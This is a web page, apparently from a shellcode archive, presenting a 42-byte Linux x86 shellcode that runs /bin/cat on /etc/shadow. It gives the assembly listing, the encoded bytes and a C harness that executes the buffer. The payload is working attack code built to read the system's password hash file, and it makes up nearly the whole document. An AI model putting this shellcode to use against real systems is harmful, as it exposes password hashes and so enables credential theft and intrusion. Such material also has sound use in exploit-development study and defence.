<html><head><title>Linux/x86 - execve(/bin/cat, /etc/shadow, NULL) - 42 bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
/* 
 * Title: linux/x86 execve(/bin/cat, /etc/shadow, NULL) - 42 bytes
 * Type: Shellcode
 * Author: antrhacks
 * Platform: Linux X86
*/

/* ASSembly
 31 c0                	xor    %eax,%eax
 50                   	push   %eax
 68 2f 63 61 74       	push   $0x7461632f
 68 2f 62 69 6e       	push   $0x6e69622f
 89 e3                	mov    %esp,%ebx
 50                   	push   %eax
 68 61 64 6f 77       	push   $0x776f6461
 68 2f 2f 73 68       	push   $0x68732f2f
 68 2f 65 74 63       	push   $0x6374652f
 89 e1                	mov    %esp,%ecx
 50                   	push   %eax
 51                   	push   %ecx
 53                   	push   %ebx
 89 e1                	mov    %esp,%ecx
 b0 0b                	mov    $0xb,%al
 cd 80
*/

int main(){
char shell[] =
&quot;\x31\xc0&quot;
&quot;\x50&quot;
&quot;\x68\x2f\x63\x61\x74&quot;
&quot;\x68\x2f\x62\x69\x6e&quot;
&quot;\x89\xe3&quot;
&quot;\x50&quot;
&quot;\x68\x61\x64\x6f\x77&quot;
&quot;\x68\x2f\x2f\x73\x68&quot;
&quot;\x68\x2f\x65\x74\x63&quot;
&quot;\x89\xe1&quot;
&quot;\x50&quot;
&quot;\x51&quot;
&quot;\x53&quot;
&quot;\x89\xe1&quot;
&quot;\xb0\x0b&quot;
&quot;\xcd\x80&quot;;

 printf(&quot;[*] Taille du ShellCode = %d\n&quot;, strlen(shell));
 (*(void (*)()) shell)();
 
 return 0;
}



<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
